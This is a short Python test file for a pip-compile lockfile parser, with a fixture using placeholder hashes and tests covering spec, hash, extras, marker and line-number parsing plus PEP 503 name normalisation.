H1 = "--hash=sha256:" + "0" * 64
H2 = "--hash=sha256:" + "1" * 64

CLEAN = f"""\
#
# This file is autogenerated by pip-compile with Python 3.12
#
certifi==2024.2.2 \\
    {H1} \\
    {H2}
idna==3.6 \\
    {H1}
requests[socks]==2.32.3 ; python_version >= "3.8" \\
    {H1}
Charset_Normalizer==3.3.2 {H1} {H2}
"""


# ─── parsing ──────────────────────────────────────────────────────────────


def test_parse_accepts_pip_compile_output() -> None:
    reqs = parse_lockfile(CLEAN)
    assert [r.spec for r in reqs] == [
        "certifi==2024.2.2", "idna==3.6", "requests[socks]==2.32.3",
        "Charset_Normalizer==3.3.2",
    ]
    by_key = {r.key: r for r in reqs}
    assert by_key["certifi"].hashes == ("sha256:" + "0" * 64, "sha256:" + "1" * 64)
    assert by_key["requests"].extras == ("socks",)
    assert by_key["requests"].marker == 'python_version >= "3.8"'
    assert by_key["charset-normalizer"].name == "Charset_Normalizer"
    assert by_key["charset-normalizer"].hashes == (
        "sha256:" + "0" * 64, "sha256:" + "1" * 64,
    )
    assert by_key["certifi"].lineno == 4


def test_normalize_name_follows_pep503() -> None:
    assert normalize_name("Foo_Bar.baz") == "foo-bar-baz"
    assert normalize_name("charset--normalizer") == "charset-normalizer"


